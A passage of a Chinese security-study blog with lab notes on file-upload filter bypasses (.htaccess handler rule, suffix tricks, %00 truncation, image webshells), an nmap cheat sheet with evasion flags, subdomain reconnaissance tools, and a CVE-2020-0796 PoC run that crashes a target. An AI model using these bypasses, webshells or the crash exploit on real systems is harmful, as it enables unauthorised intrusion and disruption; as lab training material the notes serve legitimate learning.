-<h4 id="4-htaccess文件绕过"><a href="#4-htaccess文件绕过" class="headerlink" title="4. .htaccess文件绕过"></a>4. .htaccess文件绕过</h4><p>.htaccess文件：超文本入口，也被称为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的目录中放置一个包含一个或多个指令的htaccess文件，以作用于此目录及其所有子目录。</p>
-<p><strong>也就是说我们可以利用这个文件给不同的目录配置不同的规则。</strong></p>
-<p>.htaccess文件规定的规则优先级高于默认规则。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;zhang.jpg&quot;&gt;#引号里写得是要上传的文件</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p> 先上传.htaccess文件</p>
-<p>再上传zhang.jpg</p>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109195416523.png" alt="image-20240109195416523"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109195452904.png" alt="image-20240109195452904"></p>
-<h4 id="6-后缀大小写绕过"><a href="#6-后缀大小写绕过" class="headerlink" title="6.后缀大小写绕过"></a>6.后缀大小写绕过</h4><p>如果黑名单没过滤全，并且没有将上传的文件后缀全部转换为小写（大写），那么就可以<strong>尝试修改后缀名的大小写</strong>来绕过黑名单的过滤。</p>
-<blockquote>
-<p>将文件后缀名改为.PhP</p>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109200114276.png" alt="image-20240109200114276"></p>
-<h4 id="7-后缀（空格）绕过"><a href="#7-后缀（空格）绕过" class="headerlink" title="7.后缀（空格）绕过"></a>7.后缀（空格）绕过</h4><p>系统上的文件，如果你修改后缀名，在后缀名后面加一个空格，操作系统就会默认把最后免得空格清除掉，来保证文件正常运行，但是在检测机制当中，单纯的后缀名与后缀名后面加一个空格是不一样的，这样我们就可以利用这种方法进行绕过了</p>
-<ul>
-<li>抓包把 1.php 写成 1.php空格</li>
-</ul>
-<p>这样检测机制认为php空格 和php不是一个类型，就通过了，上传到后台后，后台自动把最后一个空格去掉了，文件依旧可以执行了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240109200325436.png" alt="image-20240109200325436"></p>
-<h4 id="8-后缀添加"><a href="#8-后缀添加" class="headerlink" title="8.后缀添加."></a>8.后缀添加.</h4><p>在文件后缀名后加一个<code>.</code>。</p>
-<h4 id="9-后缀添加-DATA"><a href="#9-后缀添加-DATA" class="headerlink" title="9.后缀添加::$DATA"></a>9.后缀添加::$DATA</h4><p>在后缀名后添加<code>::$DATA</code>。</p>
-<h4 id="10-后缀添加"><a href="#10-后缀添加" class="headerlink" title="10.后缀添加. ."></a>10.后缀添加. .</h4><p>在文件名后面添加<code>. .</code>。</p>
-<p>只进行了一次<code>.</code>和空格的检验。</p>
-<h4 id="11-后缀名重写绕过"><a href="#11-后缀名重写绕过" class="headerlink" title="11.后缀名重写绕过"></a>11.后缀名重写绕过</h4><p>文件后缀名只删除了一次。</p>
-<h4 id="12-白名单"><a href="#12-白名单" class="headerlink" title="12.白名单"></a>12.白名单</h4><p>上传白名单,最后的路径是靠拼接,可以使用%00截断<br>原理：php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117192248457.png" alt="image-20240117192248457"></p>
-<h4 id="13-白名单（post）"><a href="#13-白名单（post）" class="headerlink" title="13.白名单（post）"></a>13.白名单（post）</h4><p>与上关一样,区别是post提交,post不会对里面的数据自动解码，需要在Hex中修改。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117192510344.png" alt="image-20240117192510344"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117192727762.png" alt="image-20240117192727762"></p>
-<h4 id="14-图片包含马"><a href="#14-图片包含马" class="headerlink" title="14.图片包含马"></a>14.图片包含马</h4><p>常用图片格式：</p>
-<table>
-<thead>
-<tr>
-<th>图片格式</th>
-<th>开头，结尾</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Gif格式图片的文件头标识</td>
-<td>GIF89a 或 GIF87a</td>
-</tr>
-<tr>
-<td>Jpg格式图片的文件头标识</td>
-<td>FFD8开头FFD9结尾</td>
-</tr>
-<tr>
-<td>Png格式图片的文件头标识</td>
-<td>89 20 4E 47 0D 0A</td>
-</tr>
-</tbody></table>
-<p>会判断强两个字节的来确定上传文件的后缀是否为白名单里的,需要上传图片马配合文件包含漏洞上传图片马</p>
-<p>在命令行将图片和马进行拼接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy .\1.png/b+.\zhang.php zhang1.jpg</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117194646736.png" alt="image-20240117194646736"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">连接的地址为：</span><br><span class="line">http://192.168.2.59/upload-labs-master/include.php?file=./upload/6520240117195842.jpg</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117200444545.png" alt="image-20240117200444545"></p>
-<h4 id="15"><a href="#15" class="headerlink" title="15"></a>15</h4><p>在上关的基础上,校验图片的大小,依旧可以和上关一样使用图片马绕过</p>
-<h4 id="16"><a href="#16" class="headerlink" title="16"></a>16</h4><p>在上关的基础上再检查后缀,依旧使用图片马绕过</p>
-<h4 id="17"><a href="#17" class="headerlink" title="17"></a>17</h4><p>图片马传就完事了</p>
-<h4 id="18"><a href="#18" class="headerlink" title="18"></a>18</h4><p>本系统是将文件先存在临时文件夹中再进行判断是否为正确的文件，当传输了很多的写木马的文件则服务器可能出错执行了写木马的操作。</p>
-<p>需要进行抓包并发送有木马的数据包，使服务器出错。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="clrmsspo00006j0u461r50rsw" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-nmap使用" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2024/01/08/nmap%E4%BD%BF%E7%94%A8/" class="article-date">
-  <time class="post-time" datetime="2024-01-08T11:06:15.000Z" itemprop="datePublished">
-    <span class="post-month">1月</span><br/>
-    <span class="post-day">08</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/01/08/nmap%E4%BD%BF%E7%94%A8/">nmap使用</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="nmap简介"><a href="#nmap简介" class="headerlink" title="nmap简介"></a>nmap简介</h3><p>nmap是一款非常强大的主机发现和端口扫描工具，而且nmap运用自带的脚本，还能完成漏洞检测，同时支持多平台。</p>
-<h3 id="nmap常用命令"><a href="#nmap常用命令" class="headerlink" title="nmap常用命令"></a>nmap常用命令</h3><p>主机发现 </p>
-<p>iR                                                                随机选择目标</p>
-<p>-iL                                                                从文件中加载IP地址</p>
-<p>-sL                                                               简单的扫描目标</p>
-<p>-sn                                                               Ping扫描-禁用端口扫描</p>
-<p>-Pn                                                              将所有主机视为在在线，跳过主机发现</p>
-<p>-PS[portlist]                                              （TCP SYN ping） 需要root权限</p>
-<p>-PA[portlist]                                              （TCP ACK ping）</p>
-<p>-PU[portlist]                                              （UDP  ping）</p>
-<p>-PY [portlist]                                             （SCTP ping）</p>
-<p>-PE&#x2F;PP&#x2F;PM                                                 ICMP回显，时间戳和网络掩码请求探测</p>
-<p>-PO[协议列表]                                            IP协议Ping</p>
-<p>-n&#x2F;-R                                                           从不执行DNS解析&#x2F;始终解析[默认：有时]</p>
-<p>–dns-servers                                              指定自定义DNS服务器</p>
-<p>–system-dns                                              使用OS的dns服务器</p>
-<p>–traceroute                                                跟踪到每个主机的跃点路径</p>
-<p>扫描技术</p>
-<p>-sS                                                             使用TCP的SYN进行扫描</p>
-<p>-sT                                                             使用TCP进行扫描</p>
-<p>-sA                                                            使用TCP的ACK进行扫描</p>
-<p>-sU                                                            UDP扫描</p>
-<p>-sI                                                             Idle扫描</p>
-<p>-sF                                                            FIN扫描</p>
-<p>-b&lt;FTP中继主机&gt;                                     FTP反弹扫描</p>
-<p>端口规格和扫描顺序</p>
-<p>-p                                                              扫描指定端口</p>
-<p>–exclude-ports                                         从扫描中排除指定端口</p>
-<p>-f                                                               快速模式-扫描比默认扫描更少的端口</p>
-<p>-r                                                               连续扫描端口-不随机化</p>
-<p>–top-ports                                                 扫描<number>最常用的端口</p>
-<p>服务&#x2F;版本探测</p>
-<p>-sV                                                            探测服务&#x2F;版本信息</p>
-<p>–version-intensity                                     设置版本扫描强度（0-9）</p>
-<p>–version-all                                              尝试每个强度探测</p>
-<p>–version-trace                                          显示详细的版本扫描活动（用于调试）</p>
-<p>脚本扫描</p>
-<p>-SC                                                           等效于 –script&#x3D;defult</p>
-<p>–script &#x3D; <lua scripts>,<lua scripts>        以逗号分隔的目录，脚本文件或脚本类别</p>
-<p>–script-args &#x3D; &lt;n1&#x3D;v1, n2&#x3D;v2&gt;               为脚本提供参数</p>
-<p>–script-args-file&#x3D;文件名                          从文件名中加载脚本参数</p>
-<p>–script-trace                                            显示发送和接受的所有数据</p>
-<p>–script-updatedb                                     更新脚本数据库</p>
-<p>–script-help&#x3D;<lua scripts>                      显示有关脚本的帮助</p>
-<p>操作系统检测</p>
-<p>-o                                                            启用os检测</p>
-<p>–osscan-limit                                          将os检测限制为可能的目标</p>
-<p>–osscan-guess                                       推测操作系统检测结果</p>
-<p>时间和性能</p>
-<p>–host-timeout                                         设置超时时间</p>
-<p>–scan-delay                                           设置探测之间的时间间隔</p>
-<p>-T  &lt;0-5&gt;                                                设置时间模板,值越小，IDS报警几率越低</p>
-<p>防火墙&#x2F;IDS规避和欺骗</p>
-<p>-f                                                             报文分段</p>
-<p>-s                                                             欺骗源地址</p>
-<p>-g                                                            使用指定的本机端口</p>
-<p>–proxies &lt;url,port&gt;                                 使用HTTP&#x2F;SOCK4代理</p>
-<p>-data<hex string>                                   想发送的数据包中追加自定义的负载</p>
-<p>–data-string                                            将自定义的ACSII字符串附加到发送数据包中   </p>
-<p>–data-length                                           发送数据包时，附加随机数据</p>
-<p>–spoof-mac                                            MAC地址欺骗</p>
-<p>–badsum                                                发送带有虚假TCP&#x2F;UNP&#x2F;STCP校验和的数据包</p>
-<p>输出</p>
-<p>-oN                                                         标准输出</p>
-<p>-oX                                                         XMl输出</p>
-<p>-oS                                                         script jlddi3</p>
-<p>-oG                                                        grepable</p>
-<p>-oA                                                         同时输出三种主要格式</p>
-<p>-v                                                           信息详细级别</p>
-<p>-d                                                           调试级别</p>
-<p>–packet-trace                                        跟踪发送和接收的报文</p>
-<p>–reason                                                 显示端口处于特殊状态的原因</p>
-<p>–open                                                    仅显示开放的端口</p>
-<p>杂项</p>
-<p>-6                                                          启动Ipv6扫描</p>
-<p>-A                                                          启动Os检测，版本检测，脚本扫描和traceroute</p>
-<p>-V                                                          显示版本号</p>
-<p>-h                                                          帮助信息</p>
-<h3 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h3><h4 id="1-扫描指定IP地址-ping-扫描"><a href="#1-扫描指定IP地址-ping-扫描" class="headerlink" title="1.扫描指定IP地址(ping 扫描)"></a><strong>1.扫描指定IP地址(ping 扫描)</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -sn 175.178.10.6</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108191206148.png" alt="image-20240108191206148"></p>
-<h4 id="2-扫描指定IP地址"><a href="#2-扫描指定IP地址" class="headerlink" title="2.扫描指定IP地址"></a><strong>2.扫描指定IP地址</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 175.178.10.6 || nmap -p- 175.178.10.6</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108191403183.png" alt="image-20240108191403183"></p>
-<h4 id="3-提取文件中的IP地址"><a href="#3-提取文件中的IP地址" class="headerlink" title="3.提取文件中的IP地址"></a><strong>3.提取文件中的IP地址</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -iL target.txt</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-扫描主机的指定端口"><a href="#4-扫描主机的指定端口" class="headerlink" title="4.扫描主机的指定端口"></a>4.<strong>扫描主机的指定端口</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 175.178.10.6</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108191718414.png" alt="image-20240108191718414"></p>
-<h4 id="5-使用TCP的SYN进行扫描（半开放扫描，只发送SYN，如果服务器回复SYN，ACK。证明端口开放，不建立完整连接）"><a href="#5-使用TCP的SYN进行扫描（半开放扫描，只发送SYN，如果服务器回复SYN，ACK。证明端口开放，不建立完整连接）" class="headerlink" title="5.使用TCP的SYN进行扫描（半开放扫描，只发送SYN，如果服务器回复SYN，ACK。证明端口开放，不建立完整连接）"></a><strong>5.使用TCP的SYN进行扫描（半开放扫描，只发送SYN，如果服务器回复SYN，ACK。证明端口开放，不建立完整连接</strong>）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS  175.178.10.6</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108191825987.png" alt="image-20240108191825987"></p>
-<h4 id="6-使用TCP进行扫描（默认nmap扫描方式）"><a href="#6-使用TCP进行扫描（默认nmap扫描方式）" class="headerlink" title="6.使用TCP进行扫描（默认nmap扫描方式）"></a>6.<strong>使用TCP进行扫描（默认nmap扫描方式）</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT  175.178.10.6</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108191946431.png" alt="image-20240108191946431"></p>
-<h4 id="7-使用UDP进行扫描（扫描UDP开放的端口）"><a href="#7-使用UDP进行扫描（扫描UDP开放的端口）" class="headerlink" title="7.使用UDP进行扫描（扫描UDP开放的端口）"></a>7.<strong>使用UDP进行扫描（扫描UDP开放的端口）</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 175.178.10.6</span><br></pre></td></tr></table></figure>
-
-<h4 id="8-使用FIN扫描"><a href="#8-使用FIN扫描" class="headerlink" title="8.使用FIN扫描"></a>8.<strong>使用FIN扫描</strong></h4><p>有的时候TCP SYN不是最佳的扫描默认，目标主机可能有IDS&#x2F;IPS系统的存在，防火墙可能过滤掉SYN数据包。而发送一个FIN标志的数据包不需要完成TCP的握手。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sF  175.178.10.6</span><br></pre></td></tr></table></figure>
-
-<h4 id="9-idle扫描（需要指定另外一台主机IP地址，并且目标主机的IPID是递增的）"><a href="#9-idle扫描（需要指定另外一台主机IP地址，并且目标主机的IPID是递增的）" class="headerlink" title="9.idle扫描（需要指定另外一台主机IP地址，并且目标主机的IPID是递增的）"></a>9.<strong>idle扫描（需要指定另外一台主机IP地址，并且目标主机的IPID是递增的）</strong></h4><p>idlescan是一种理想的扫描方式，它使用另一台网络上的主机替你发送数据包，从而隐藏自己。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sI  192.168.3.227(代替本机发送数据包的主机的IP地址) 175.178.10.6(要访问的IP地址)</span><br></pre></td></tr></table></figure>
-
-<h4 id="10-获得服务版本详细信息"><a href="#10-获得服务版本详细信息" class="headerlink" title="10.获得服务版本详细信息"></a>10.<strong>获得服务版本详细信息</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 175.178.10.6</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240108192658674.png" alt="image-20240108192658674"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/08/nmap%E4%BD%BF%E7%94%A8/" data-id="clrmsspnr0000j0u41kbz3g0z" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-信息搜集" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2024/01/08/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
-  <time class="post-time" datetime="2024-01-08T11:05:53.000Z" itemprop="datePublished">
-    <span class="post-month">1月</span><br/>
-    <span class="post-day">08</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/01/08/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><strong>1.内容</strong>：收集信息主要为目标资产与可能存在相关漏洞的信息。包括但不限于主站、 二级域名、旁站、c 段、微信公众号、微信小程序、App 程序、下属单位、子公 司、开发商、域名厂商、dns 、服务器、cdn 厂商、服务器厂商等。</p>
-<p><strong>2.作用</strong>：了解组织安全架构，缩小攻击范围，描绘网络拓扑结构，建立脆弱点</p>
-<h4 id="主动信息搜集"><a href="#主动信息搜集" class="headerlink" title="主动信息搜集"></a>主动信息搜集</h4><p>通过与目标交互，从而拿到目的信息</p>
-<p><strong>缺点</strong>：会暴露自己，留下访问日志</p>
-<h4 id="单位股权架构"><a href="#单位股权架构" class="headerlink" title="单位股权架构"></a>单位股权架构</h4><p><strong>单位组织信息：</strong>组织架构、子公司、下属单位、注册资本（cnvd证书）</p>
-<p><strong>查询方法：</strong>天眼查、企查查、爱企查、小蓝本、钉钉企典等</p>
-<p><strong>查用网址工具：</strong></p>
-<ol>
-<li><strong>天眼查</strong> <a target="_blank" rel="noopener" href="https://m.tianyancha.com/">天眼查</a></li>
-<li><strong>企查查</strong><a target="_blank" rel="noopener" href="https://www.qcc.com/">企查查 - 企业工商信息查询系统_查企业_查老板_查风险就上企查查!</a></li>
-<li><strong>小蓝本</strong><a target="_blank" rel="noopener" href="https://www.xiaolanben.com/">获客营销系统_ai智能拓客系统_企业获客系统-小蓝本拓客软件</a></li>
-<li><strong>爱企查</strong><a target="_blank" rel="noopener" href="https://www.aiqicha.com/">爱企查首页 - 专业企业查询平台 - 查企业 - 查老板 - 查风险 - 工商信息查询系统</a></li>
-<li><strong>国外企查</strong> <a target="_blank" rel="noopener" href="https://opencorporates.com/">https://opencorporates.com/</a></li>
-</ol>
-<p>这里需要注意的是资产不一定是带baidu的，可能是一些其它的，如果是百度百分百控股的也可以提交，或者域名反查是不是百度百分百控股的，这种就属于是边缘资产。</p>
-<h4 id="域名查询"><a href="#域名查询" class="headerlink" title="域名查询"></a>域名查询</h4><p>主要分为备案域名和非备案域名</p>
-<p><strong>核心目的：子域名挖掘</strong></p>
-<h5 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h5><p>子域名在线爆破：<a target="_blank" rel="noopener" href="http://z.zcjun.com/">http://z.zcjun.com/</a></p>
-<h5 id="搜索引擎搜索"><a href="#搜索引擎搜索" class="headerlink" title="搜索引擎搜索"></a>搜索引擎搜索</h5><p>fofa:<a target="_blank" rel="noopener" href="https://fofa.info/toLogin">https://fofa.info/toLogin</a></p>
-<p>360:<a target="_blank" rel="noopener" href="https://quake.360.net/quake/#/index">https://quake.360.net/quake/#/index</a></p>
-<p>奇安信：<a target="_blank" rel="noopener" href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p>
-<p>钟馗之眼：<a target="_blank" rel="noopener" href="https://www.zoomeye.org/business">https://www.zoomeye.org/business</a></p>
-<p>shodan：<a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a></p>
-<p>CensysSearch:<a target="_blank" rel="noopener" href="https://search.censys.io/">https://search.censys.io/</a></p>
-<p>微步在线：<a target="_blank" rel="noopener" href="https://www.threatbook.cn/next/index">https://www.threatbook.cn/next/index</a></p>
-<p>whois查询：<a target="_blank" rel="noopener" href="https://whois.chinaz.com/">域名Whois查询 - 站长之家</a> </p>
-<p><strong>fofa语法：（fofa有一个很有趣的地方是fofa可以用于检测蜜罐了</strong>😲）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">title=”beijing” 从标题中搜索“北京” </span><br><span class="line"> </span><br><span class="line">header=”elastic” 从 http 头中搜索“elastic” </span><br><span class="line"></span><br><span class="line">body=”网络空间测绘” 从 html 正文中搜索“网络空间测绘” </span><br><span class="line"> </span><br><span class="line">domain=”qq.com” 搜索根域名带有 qq.com 的网站。 </span><br><span class="line"> </span><br><span class="line">icon_hash=”-247388890” 搜索使用此 icon 的资产。仅限 FOFA 高级会员使用</span><br><span class="line"></span><br><span class="line">fid=&quot;sSXXGNUO2FefBTcCLIT/2Q==&quot;	</span><br><span class="line"></span><br><span class="line">host=”.gov.cn” 从 url 中搜索”.gov.cn” 搜索要用 host 作为名称 </span><br><span class="line"> </span><br><span class="line">port=”6379” 查找对应“6379”端口的资产 </span><br><span class="line"></span><br><span class="line">cert=“baidu” 搜索证书(https或者imaps等)中带有baidu的资产</span><br><span class="line"></span><br><span class="line">icp=”京 ICP 证 030173 号” 查找备案号为“京 ICP 证 030173 号”的网站 搜索网站类型资产 </span><br><span class="line"> </span><br><span class="line">ip=”1.1.1.1” 从 ip 中搜索包含“1.1.1.1”的网站 搜索要用 ip 作为名称 </span><br><span class="line"> </span><br><span class="line">ip=”220.181.111.1/24” 查询 IP 为“220.181.111.1”的 C 网段资产 </span><br><span class="line"> </span><br><span class="line">status_code=”402” 查询服务器状态为“402”的资产 </span><br><span class="line"> </span><br><span class="line">app=&quot;&quot; 查找设备 </span><br><span class="line"> </span><br><span class="line">protocol=&quot;&quot; 查询协议资产 </span><br><span class="line"></span><br><span class="line">js_name=&quot;js/jquery.js&quot;</span><br><span class="line"></span><br><span class="line">js_md5=&quot;82ac3f14327a8b7ba49baa208d4eaa15&quot;</span><br><span class="line"></span><br><span class="line">is_honeypot=&quot;false&quot; 检测是不是蜜罐</span><br><span class="line"></span><br><span class="line">以下为例： </span><br><span class="line"> </span><br><span class="line">查找有 elasticsearch 的服务器 </span><br><span class="line"> </span><br><span class="line">port=&quot;9200&quot; &amp;&amp; protocol==&quot;elastic&quot; </span><br><span class="line"> </span><br><span class="line">app=&quot;redis&quot; &amp;&amp; country=CN </span><br><span class="line"> </span><br><span class="line">app=&quot;泛微-协同商务系统&quot; </span><br><span class="line">app=&quot;泛微-协同商务系统&quot; || app=&quot;泛微-协同办公 OA&quot; || app=&quot;泛微-E-Weaver&quot; || app=&quot;泛微- EOffice&quot; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="工具字典"><a href="#工具字典" class="headerlink" title="工具字典"></a>工具字典</h4><p>github上面有很多的子域名字典，有些工具也有自带的字典，字典还是要靠自己平时构造和收集</p>
-<h4 id="OneForAll-Python"><a href="#OneForAll-Python" class="headerlink" title="OneForAll(Python)"></a>OneForAll(Python)</h4><p>下载网址：<a target="_blank" rel="noopener" href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p>
-<p>运行示例：python3 oneforall.py –target&#x3D;target.com run</p>
-<h4 id="Layer-Win"><a href="#Layer-Win" class="headerlink" title="Layer(Win)"></a>Layer(Win)</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a></p>
-<h4 id="dnsenum-kali"><a href="#dnsenum-kali" class="headerlink" title="dnsenum(kali)"></a>dnsenum(kali)</h4><h4 id="subDomainsBrute-python"><a href="#subDomainsBrute-python" class="headerlink" title="subDomainsBrute(python)"></a>subDomainsBrute(python)</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p>
-<p>运行示例：python subDomainsbrute.py xtarget.com</p>
-<h4 id="Sublist3r-python"><a href="#Sublist3r-python" class="headerlink" title="Sublist3r(python)"></a>Sublist3r(python)</h4><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p>
-<p>运行示例：python sublist3r.py -d target.com -b -t 50 -p 80,443,21,22</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/08/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="clrmsspny0004j0u45502bogj" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-永恒之黑" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2024/01/08/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/" class="article-date">
-  <time class="post-time" datetime="2024-01-08T02:55:56.000Z" itemprop="datePublished">
-    <span class="post-month">1月</span><br/>
-    <span class="post-day">08</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/01/08/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91/">永恒之黑</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>从<a target="_blank" rel="noopener" href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">检测工具</a> 这个网址下载检测工具</p>
-<p>执行以下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-0796-Scanner.exe 攻击电脑的IP地址 </span><br></pre></td></tr></table></figure>
-
-<p>查看是否有永恒之黑漏洞</p>
-<p>下载poc脚本发起攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载POC：https://github.com/eerykitty/CVE-2020-0796-PoC</span><br></pre></td></tr></table></figure>
-
-<p>需要下载一些python文件，才能运行脚本。pip下载，根据提示下载相应文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2020-0796.py 攻击电脑的IP地址 </span><br></pre></td></tr></table></figure>
-
-<p>运行脚本被攻击的电脑就会蓝屏。</p>
-
-      
-    </div>
-    <footer class="article-footer">
